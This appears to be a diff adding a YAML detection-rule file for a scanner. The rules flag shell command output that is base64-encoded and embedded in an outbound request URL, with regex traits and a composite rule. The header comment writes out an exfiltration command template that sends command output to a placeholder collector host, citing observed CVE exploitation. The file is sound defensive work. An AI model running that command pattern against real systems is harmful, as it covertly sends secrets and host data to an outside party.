@@ -1,0 +1,52 @@
+# Command output exfiltrated through request-URL interpolation.
+#
+# `curl http://<collector>/<id>_$(<command> | base64 -w0)` runs a local
+# command and embeds its (usually base64-wrapped) output into the URL path of
+# an outbound request, keyed by a per-attempt identifier: an out-of-band
+# collection channel that keeps the payload out of application logs. Observed
+# in Switchvox CVE-2026-9586 exploitation (Horizon3.ai, Aug 2026), where the
+# encoded command enumerated running processes; the same channel carries any
+# harvested value, from host fingerprints to signing keys.
+defaults:
+  platforms: [unix, windows]
+  for: [shell, text, python, javascript, typescript]
+  attack: T1041
+
+traits:
+  - id: url-command-substitution
+    desc: URL embeds command substitution output
+    crit: suspicious
+    conf: 0.85
+    # A URL literal containing a $( ...) — command substitution inside a
+    # request URL means "execute this and send me the output". Backtick is
+    # excluded from the continuation class so the match cannot cross a JS
+    # template-literal boundary into unrelated code that merely happens to
+    # call a minified `$(...)` helper (classnames/jQuery-style) shortly
+    # after an unrelated URL string — observed in sidebar_bookmarks.xpi's
+    # BrowsingStatsAppPanel bundle: `https://${t.host}` followed by
+    # `className:$("shrink-0", f.favicon)`.
+    if:
+      type: text
+      regex: 'https?://[^''"`\s]{0,120}\$\('
+
+  - id: pipe-group-base64-stdout
+    desc: Command group piped to base64
+    crit: notable
+    conf: 0.85
+    # A { ...; } command group piped into base64 with no output file:
+    # wrapping command output for transport rather than for storage.
+    if:
+      type: text
+      regex: '\}\s*\|\s*base64\b'
+
+composite_rules:
+  - id: command-output-url-base64-exfil
+    desc: Command output base64-wrapped into URL
+    crit: hostile
+    conf: 0.95
+    # Command output encoded and shipped as part of a request URL: an
+    # exfiltration channel with no legitimate application purpose.
+    all:
+      - id: url-command-substitution
+      - id: pipe-group-base64-stdout
+    near_bytes: 512
